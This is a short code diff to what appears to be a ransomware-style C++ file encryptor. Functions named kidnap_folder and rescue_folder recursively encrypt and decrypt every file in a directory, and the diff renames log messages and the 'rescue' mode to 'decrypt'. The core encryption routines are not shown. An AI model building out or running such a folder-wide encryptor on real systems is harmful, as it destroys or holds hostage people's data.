@@ -75,9 +75,9 @@ void kidnap_folder(string path, int depth) {
     string s(depth * 2, ' ');
     string current_dir = path;
 
-    cout << s << "+ Folder: " << current_dir << endl;
+    cout << s << "+ Directory: " << current_dir << endl;
     for (auto &file_name : files) {
-        cout << s << "  - Kidnaping: " << file_name << endl;
+        cout << s << "  - Encrypting: " << file_name << endl;
         kidnap_file(file_name);        
     }
 
@@ -97,9 +97,9 @@ void rescue_folder(string path, int depth) {
     string s(depth * 2, ' ');
     string current_dir = path;
 
-    cout << s << "+ Folder: " << current_dir << endl;
+    cout << s << "+ Directory: " << current_dir << endl;
     for (auto &file_name : files) {
-        cout << s << "  - Rescuing: " << file_name << endl;
+        cout << s << "  - Decrypting: " << file_name << endl;
         rescue_file(file_name);        
     }
 
@@ -111,6 +111,6 @@ void rescue_folder(string path, int depth) {
 int main(int argc, char** argv) {
     string mode = string(argv[1]), folder_name = string(argv[2]);
     if (mode == "kidnap") kidnap_folder(folder_name, 0);    
-    else if (mode == "rescue") rescue_folder(folder_name, 0);
+    else if (mode == "decrypt") rescue_folder(folder_name, 0);
     return 0;
 }
